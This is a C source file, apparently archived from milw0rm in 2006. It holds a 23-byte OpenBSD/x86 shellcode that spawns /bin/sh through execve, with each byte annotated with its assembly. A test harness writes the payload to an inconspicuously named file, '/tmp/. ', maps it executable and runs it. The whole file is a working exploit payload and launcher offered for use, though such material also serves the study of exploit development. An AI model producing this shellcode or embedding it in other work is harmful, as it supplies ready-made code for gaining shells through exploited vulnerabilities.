/*
 * [OpenBSD/x86]
 * Shellcode for: execve("/bin/sh", ["/bin/sh"], NULL)
 * 23 bytes
 * hophet [at] gmail.com
 * http://www.nlabs.com.br/~hophet/
 *
 * Fancy mappings by iruata souza (muzgo)
 * iru.muzgo!gmail.com
 * http://openvms-rocks.com/~muzgo/
 */

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>

#include <err.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

char shellcode[] =

"\x99"					/* cltd */
"\x52"					/* push	%edx */
"\x68\x6e\x2f\x73\x68"			/* push	$0x68732f6e */
"\x68\x2f\x2f\x62\x69"			/* push	$0x69622f2f */
"\x89\xe3"				/* mov	%esp,%ebx */
"\x52"					/* push	%edx */
"\x54"					/* push	%esp */
"\x53"                          	/* push	%ebx */
"\x53"					/* push	%ebx */
"\x6a\x3b"				/* push	$0x3b */
"\x58"					/* pop	%eax */
"\xcd\x80";				/* int	$0x80 */

/*
 * Since shellcode above will be mapped in .rodata (read-only protection),
 * we need to write it to a file and map the file with PROT_EXEC in order
 * to execute it.
 */

int main(void)
{
        void (*p)();
	int fd;

	fd=open("/tmp/. ", O_RDWR|O_CREAT, S_IRUSR|S_IWUSR);
	if(fd < 0)
		err(1, "open");

	write(fd, shellcode, strlen(shellcode));
	if((lseek(fd, 0L, SEEK_SET)) < 0)
		err(1, "lseek");

	p = (void (*)())mmap(NULL, strlen(shellcode), PROT_READ|PROT_EXEC, NULL, fd, NULL);
	if (p == (void (*)())MAP_FAILED)
		err(1, "mmap");
	p();
	return 0;
}

// milw0rm.com [2006-05-01]